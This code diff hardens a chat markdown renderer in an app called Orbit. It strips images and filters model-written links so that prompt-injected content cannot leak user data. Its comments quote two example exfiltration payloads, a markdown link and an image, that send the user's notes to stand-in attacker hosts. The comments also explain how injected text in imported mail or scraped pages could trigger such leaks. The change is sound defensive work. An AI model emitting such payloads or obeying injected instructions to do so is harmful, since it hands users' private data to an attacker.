@@ -8,6 +8,7 @@ import remarkGfm from "remark-gfm";
 import { SourceChip } from "@/components/chat/source-chip";
 import type { EvidenceSource } from "@/lib/chat-evidence";
 import { cn } from "@/lib/utils";
+import { safeChatHref } from "@/lib/safe-links";
 
 /** Soften common model output where list items are jammed onto one line. */
 function normalizeProse(text: string) {
@@ -169,16 +170,25 @@ function buildComponents(matcher: NameMatcher | null, evidence: EvidenceContext 
     input: ({ checked }) => (
       <input type="checkbox" checked={Boolean(checked)} disabled readOnly className="mr-1.5 align-middle" />
     ),
-    a: ({ href, children }) => (
-      <a
-        href={href}
-        target="_blank"
-        rel="noreferrer"
-        className="font-medium text-primary underline underline-offset-2"
-      >
-        {children}
-      </a>
-    ),
+    // Model-written links pass `safeChatHref` or render as plain text. Images are already
+    // gone (see DISALLOWED_ELEMENTS); this closes the one-click version of the same leak — an
+    // injected `[verify](https://evil.example/?d=<your notes>)` — without losing ordinary
+    // profile and event links.
+    a: ({ href, children }) => {
+      const safe = safeChatHref(href);
+      if (!safe) return <span className="font-medium">{children}</span>;
+      return (
+        <a
+          href={safe}
+          target="_blank"
+          rel="noopener noreferrer nofollow"
+          referrerPolicy="no-referrer"
+          className="font-medium text-primary underline underline-offset-2"
+        >
+          {children}
+        </a>
+      );
+    },
     code: ({ children }) => (
       <code className="rounded bg-muted px-1 py-0.5 text-[0.9em]">{children}</code>
     ),
@@ -200,6 +210,15 @@ function buildComponents(matcher: NameMatcher | null, evidence: EvidenceContext 
 }
 
 const REMARK_PLUGINS = [remarkGfm];
+
+/**
+ * Images are never rendered. Chat answers are model output over text Orbit did not write
+ * (imported mail, scraped pages, transcripts), and a prompt-injected
+ * `![](https://attacker.example/?d=<summary of your notes>)` would be fetched by the
+ * browser the moment the answer rendered — no click, and `img-src https:` allows it. Orbit's
+ * answers have no use for remote images, so there is nothing to allowlist.
+ */
+const DISALLOWED_ELEMENTS = ["img"];
 
 /** The no-people, no-citations set is shared, so the common case never rebuilds it. */
 const PLAIN_COMPONENTS = buildComponents(null, null);
@@ -252,7 +271,11 @@ export const ChatMarkdown = memo(function ChatMarkdown({
 
   return (
     <div className={cn("chat-markdown", className)}>
-      <ReactMarkdown remarkPlugins={REMARK_PLUGINS} components={components}>
+      <ReactMarkdown
+        remarkPlugins={REMARK_PLUGINS}
+        components={components}
+        disallowedElements={DISALLOWED_ELEMENTS}
+      >
         {normalizeChatMarkdown(children)}
       </ReactMarkdown>
     </div>
